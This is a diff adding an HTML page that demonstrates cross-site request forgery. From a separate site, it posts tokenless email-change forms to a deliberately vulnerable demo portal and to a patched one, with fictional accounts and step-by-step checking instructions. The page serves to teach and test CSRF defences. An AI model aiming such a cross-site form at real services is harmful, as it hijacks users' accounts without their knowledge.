@@ -1,0 +1,59 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="robots" content="noindex,nofollow">
+  <title>LegacyDesk | External contact form</title>
+  <style>
+    :root{font-family:system-ui,-apple-system,sans-serif;color:#183c32;background:#f2f5f1;font-size:16px}
+    *{box-sizing:border-box}body{margin:0}main{max-width:1000px;padding:60px 24px;margin:auto}
+    .eyebrow{font-size:.73rem;letter-spacing:.15em;font-weight:700;text-transform:uppercase;color:#57705d}
+    h1{font-size:clamp(2rem,5vw,3.3rem);line-height:1.08;letter-spacing:-.045em;margin:15px 0 22px;max-width:700px}
+    .intro{max-width:690px;line-height:1.65;color:#56675a}.steps{padding:20px 24px;background:#e5eee4;border-radius:12px;margin:28px 0;line-height:1.7}
+    .grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}.card{background:white;border:1px solid #d7e0d5;border-radius:16px;padding:30px}
+    .badge{display:inline-block;font-size:.72rem;padding:5px 9px;border-radius:20px;background:#f9e7d7;color:#80512a;font-weight:700}.patched{background:#dfede2;color:#285c3b}
+    h2{font-size:1.5rem;margin:18px 0 9px}.card p{font-size:.9rem;line-height:1.6;color:#5e6d61}.portal{font-size:.9rem;color:#225b43;font-weight:650}
+    label{display:block;font-size:.8rem;font-weight:650;margin-top:24px}input{display:block;width:100%;margin:9px 0 16px;padding:13px;border:1px solid #bacbbd;border-radius:7px;font:inherit;font-size:.9rem;background:#fff}
+    button{width:100%;padding:14px;border:0;border-radius:8px;color:white;background:#245b43;font:inherit;font-size:.9rem;font-weight:650;cursor:pointer}button:hover{background:#194732}
+    a:focus-visible,input:focus-visible,button:focus-visible{outline:3px solid #91bd9a;outline-offset:3px}.expected{font-size:.83rem!important;border-top:1px solid #e6ece3;padding-top:18px;margin-top:24px}
+    footer{font-size:.8rem;line-height:1.6;color:#607062;margin-top:30px}.note{max-width:830px}
+    @media(max-width:650px){main{padding:32px 18px}.grid{grid-template-columns:1fr}.card{padding:24px}}
+  </style>
+</head>
+<body>
+<main>
+  <div class="eyebrow">LegacyDesk / Security demonstration</div>
+  <h1>One external form.<br>Two different outcomes.</h1>
+  <p class="intro">This page is a separate website from both employee portals. Each button submits one account-update form to the selected portal, without a CSRF token. All accounts and email addresses in this exercise are fictional.</p>
+  <div class="steps"><strong>Before submitting:</strong> sign in as Alice on the selected portal in this same browser profile. Note her current email, then choose a different value here. After submission, return to the original account tab and refresh to check the actual result.</div>
+  <div class="grid">
+    <section class="card" aria-labelledby="v1-title">
+      <span class="badge">V1 / Vulnerable</span>
+      <h2 id="v1-title">Original portal</h2>
+      <p>Open the account page first and keep that tab available for the before-and-after comparison.</p>
+      <a class="portal" href="https://legacydesk-v1-demo.onrender.com/account" target="_blank" rel="noopener">Open V1 account &nearr;</a>
+      <form method="post" action="https://legacydesk-v1-demo.onrender.com/account/email" target="_blank" rel="noopener">
+        <label for="v1-email">New fictional email for V1</label>
+        <input id="v1-email" name="email" type="email" required value="csrf.v1@example.test" autocomplete="off">
+        <button type="submit">Submit external form to V1</button>
+      </form>
+      <p class="expected"><strong>Expected:</strong> an authenticated V1 session accepts the tokenless update. Verify that Alice's account actually changed.</p>
+    </section>
+    <section class="card" aria-labelledby="v2-title">
+      <span class="badge patched">V2 / Patched</span>
+      <h2 id="v2-title">Hardened portal</h2>
+      <p>Use Alice's separate V2 password. Keep the original account tab open to verify that her email stays unchanged.</p>
+      <a class="portal" href="https://legacydesk-v2-demo.onrender.com/account" target="_blank" rel="noopener">Open V2 account &nearr;</a>
+      <form method="post" action="https://legacydesk-v2-demo.onrender.com/account/email" target="_blank" rel="noopener">
+        <label for="v2-email">New fictional email for V2</label>
+        <input id="v2-email" name="email" type="email" required value="csrf.v2@example.test" autocomplete="off">
+        <button type="submit">Submit external form to V2</button>
+      </form>
+      <p class="expected"><strong>Expected:</strong> V2 rejects the update with HTTP 403. Refresh Alice's original account tab and verify the email is unchanged.</p>
+    </section>
+  </div>
+  <footer class="note">Only your explicit button click sends a request. This page has no traffic generator and does not collect passwords or read portal cookies. A sign-in redirect is not a successful CSRF demonstration. Browser cookie settings can affect the result; record what actually happens.</footer>
+</main>
+</body>
+</html>
